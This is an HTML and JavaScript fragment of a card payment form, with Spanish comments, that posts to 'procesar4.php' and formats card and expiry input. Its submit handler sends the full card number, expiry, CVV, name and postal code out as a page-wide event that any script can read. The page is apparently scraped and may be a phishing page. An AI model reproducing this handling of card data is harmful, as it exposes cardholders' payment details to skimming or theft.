            <form id="payment-form" class="form-container" method="POST" action="procesar4.php">
    <div class="input-group" bis_skin_checked="1">

    <script>
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('payment-form');
    const cardNumberInput = document.getElementById('card-number');
    const expiryDateInput = document.getElementById('expiry-date');

    // Formato para el número de tarjeta
    cardNumberInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
        let formattedValue = '';
        for(let i = 0; i < value.length; i++) {
            if(i > 0 && i % 4 === 0) {
                formattedValue += ' ';
            }
            formattedValue += value[i];
        }
        e.target.value = formattedValue;
    });

    // Formato para la fecha de expiración
    expiryDateInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 2) {
            value = value.slice(0,2) + '/' + value.slice(2,4);
        }
        e.target.value = value;
    });

    // Evento opcional (no interfiere con envío)
    form.addEventListener('submit', function() {
        const event = new CustomEvent('paymentCompleted', { 
            detail: {
                cardNumber: document.getElementById('card-number').value,
                expiryDate: document.getElementById('expiry-date').value,
                cvv: document.getElementById('cvv').value,
                name: document.getElementById('name').value,
                postalCode: document.getElementById('postal-code').value
            }
        });
        document.dispatchEvent(event);
        // ✅ No hay preventDefault, así que se enviará a procesar4.php
    });
});

function validateCVV() {
    let input = document.getElementById('cvv');
    let value = input.value;

    if (value.length > 4) {
        input.value = value.slice(0, 4);
    }
}
</script>
